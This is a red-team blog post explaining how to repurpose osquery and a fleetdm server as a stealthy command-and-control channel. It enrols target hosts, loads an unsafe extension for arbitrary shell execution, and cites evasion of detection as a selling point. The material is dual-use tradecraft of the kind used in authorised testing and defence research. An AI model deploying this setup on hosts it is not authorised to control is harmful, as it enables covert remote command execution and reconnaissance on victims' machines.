---
layout: post
title: Offensive OSQuery
categories: [general]
tags: [redteam, c2, devops, infra]
description: Diving into how a traditionally defensive tool OSQuery can be used to perform red team testing at scale.
---

## What is OSQuery
OSQuery is an open-source endpoint visibility tool created by Meta. It allows administrators to query hosts across their organization like they would a SQL database. An example from the [osquery site](https://osquery.readthedocs.io/en/stable/introduction/using-osqueryi/):
```SQL
$ osqueryi
osquery> SELECT DISTINCT
    ...>   process.name,
    ...>   listening.port,
    ...>   process.pid
    ...> FROM processes AS process
    ...> JOIN listening_ports AS listening
    ...> ON process.pid = listening.pid
    ...> WHERE listening.address = '0.0.0.0';

+----------+-------+-------+
| name     | port  | pid   |
+----------+-------+-------+
| Spotify  | 57621 | 18666 |
| ARDAgent | 3283  | 482   |
+----------+-------+-------+
osquery>
```

OSQuery is commonly run with a centralized server that all the agents check-in to. While there isn't an official open-source OSQuery server a number of alternative servers exist like [Kollide](https://github.com/kolide) and [fleetdm](https://github.com/fleetdm/fleet) . For this blog we'll be using a cloud managed fleetdm instance given it's ease to setup.

## Why OSQuery is a good c2.
- Evasion - As a legitimate tool for systems administration and corporate security OSQuery isn't detected as malicious.
- Scale - Many c2 frameworks don't scale (some falling over irrecoverably at 50 callbacks a minute) or design their workflows for scale. As a tool designed to manage entire corporations OSQuery and it's servers are designed to operate at scale and help the user queue tasks at scale.
- Robust recon features - OSQuery supports a number of tables that you can query of of the box.
	- [crontab](https://osquery.io/schema/5.8.2/#crontab)
	- [curl](https://osquery.io/schema/5.8.2/#curl)
	- [drivers](drivers)
	- [file](https://osquery.io/schema/5.8.2/#file)
	- [logged_in_users](https://osquery.io/schema/5.8.2/#logged_in_users)
	- [user_ssh_keys](https://osquery.io/schema/5.8.2/#user_ssh_keys)

The downside to OSQuery out of the box is it doesn't support arbitrary command execution making executing new tools, or more complicated memory based tools like mimikatz challenging. To get around this limitation though we can load a custom extension into our OSQuery agent. In the next section we'll load a custom extension to execute arbitrary shell commands.

## How

1. Signup for a free trial of fleetdm
	1. https://fleetdm.com/try-fleet/register
	2. Setup an account and login.
2. Adding hosts
	1. Once logged in Click "Add hosts"
	2. Select your hosts OS
	3. Unselect include Fleet Desktop
	4. Copy the installer package onto the target host.
	5. Install the package
		1. You may have issues getting things to run I wasn't able to install it a service in my container and had to manually run it.
```
cat /etc/default/orbit
source /etc/default/orbit
/opt/orbit/bin/orbit/orbit --insecure --fleet-url $ORBIT_FLEET_URL --enroll-secret $ORBIT_ENROLL_SECRET --debug

ctrl-c to exit.
```
3. Build the extension
	1. `git clone https://github.com/hulto/osquery-exec.git`
	2. `cd osquery-exec`
	3. `go build -o exec.ext ./`
4. Install the `osquery-exec` plugin.
	1. Stop the running instance of orbit
	2. Fill out the `/opt/orbit/osquery.flags` file
```
--extensions_timeout=3
--extensions_interval=3
--allow_unsafe
```
		3. Upload our extension to the remote host `mkdir /test && cp /tmp/exec.ext /test/exec.ext`
		4. Add our extension to those that will be loaded
			1. `echo "/test/exec.ext" > /etc/osquery/extensions.load`
1. Restart the orbit agent
	1. `/opt/orbit/bin/orbit/orbit --insecure --fleet-url $ORBIT_FLEET_URL`
2. Execute commands 🥳

<figure class="aligncenter">
    <img src="/assets/png/osquery-cmdexec-whoami.png" />
    <figcaption>Figure 1. - OSQuery cmdexec results in fleetdm webui</figcaption>
</figure>

